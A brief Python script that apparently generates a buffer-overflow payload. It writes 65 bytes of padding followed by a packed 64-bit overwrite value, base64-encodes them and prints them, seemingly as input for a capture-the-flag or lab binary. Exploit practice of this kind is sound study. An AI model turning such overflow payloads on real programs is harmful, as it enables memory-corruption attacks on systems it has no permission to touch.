
import sys
import struct
import base64

buf = b'TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT'
buf += struct.pack('<Q', 4968789375655020116)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
